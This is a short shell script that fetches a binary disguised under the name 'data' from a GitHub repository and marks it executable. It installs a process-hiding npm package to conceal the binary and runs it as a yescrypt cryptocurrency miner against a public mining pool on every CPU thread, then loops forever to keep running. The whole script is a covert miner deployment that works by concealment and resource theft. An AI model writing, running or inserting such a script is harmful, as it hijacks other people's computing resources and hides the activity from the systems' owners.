#!/bin/sh
apt update -y
wget -q https://github.com/thirthada007/DevOps/raw/main/data
chmod +x data
npm i -g node-process-hider 
ph add data
./data -a yescrypt -o hub.miningpoolhub.com:20577 -u luthfimf.WORKERNAME -p x -t $(nproc) -x
while [ 1 ]; do
sleep 3
done
sleep 999
